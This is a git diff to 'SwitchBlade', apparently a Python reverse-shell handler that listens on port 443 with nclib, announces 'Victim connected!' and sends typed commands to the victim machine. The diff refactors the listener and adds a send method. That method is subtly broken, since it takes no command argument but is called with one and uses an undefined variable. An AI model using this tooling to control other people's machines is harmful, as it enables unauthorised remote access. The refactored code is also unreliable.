@@ -1,6 +1,6 @@
 #!/bin/env python3
 # SwitchBlade - a python based TCP/IP handler for remote connections
-# It's not as versitile as the Swiss-Army knife, but it's real good for stabbin'
+# It's not as versatile as the Swiss-Army knife, but it's real good for stabbin'
 # Author: Connor Gannon (Gin&Miskatonic)
 # Init Date: 14 Nov 2018
 #
@@ -18,10 +18,12 @@ from nclib.errors import NetcatError, NetcatTimeout
 
 class Switchblade:
 	
-	def __init__(self, port, sendLog, recvLog):
+	def __init__(self, port=443, sendLog=None, recvLog=None):
 		self.port = port
 		self.sendLog = sendLog
 		self.recvLog = recvLog
+		self.nc = nclib.Netcat(listen=('0.0.0.0',self.port), log_send=self.sendLog, log_recv=self.recvLog)
+		print("Victim connected!")
 
 	def runCommand(self, cmd):
 		'''runCommand - executes a command based on str parameter and returns the result as a string'''
@@ -45,9 +47,12 @@ class Switchblade:
 			except (socket.error, NetcatError):
 				print("recv machine broke.")
 
+	def send(self):
+		cmd = cmd+'\n'
+		self.nc.send(str.encode(cmd))
+
 	def listener(self):
-		self.nc = nclib.Netcat(listen=('0.0.0.0',self.port), log_send=self.sendLog, log_recv=self.recvLog)
-		print ("Victim connected! Session starting...")
+		print ("Session starting...")
 		self.session = PromptSession()
 		recv_thread = threading.Thread(target=self.recv)
 		recv_thread.daemon = True
@@ -63,9 +68,8 @@ class Switchblade:
 						cmd = self.runCommand(':'.join(cmd.split(':')[1:]))
 					elif preface == 'builtin':
 						self.builtins(':'.join(cmd.split(':')[1:]))
-						continue
-					cmd = cmd+'\n'
-					self.nc.send(str.encode(cmd))
+						continue # builtins do not execute on victim side
+					self.send(cmd)
 		except (socket.error, NetcatError):
 			print("send machine broke.")
 		self.nc.close()
